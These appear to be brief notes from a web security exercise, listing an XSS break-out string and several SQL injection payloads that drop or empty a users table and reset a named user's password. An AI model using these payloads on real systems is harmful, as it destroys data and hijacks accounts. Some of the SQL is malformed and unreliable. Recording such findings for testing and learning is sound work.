###1. XSS

- Password visible in browser address
- Creating user: 
```javascript
/script><script>
```
breaks site

- Upload site with hidden Javascript

###2. SQL Injection

- Drop table
```sql
'OR''=';DROP TABLE USERS // 1;DROP TABLE users
```
- Delete content of users
```sql
1;(DELETE * FROM users)
```
- Update password
```sql
1;UPDATE TABLE users SET password = "123" WHERE name="jake"
```

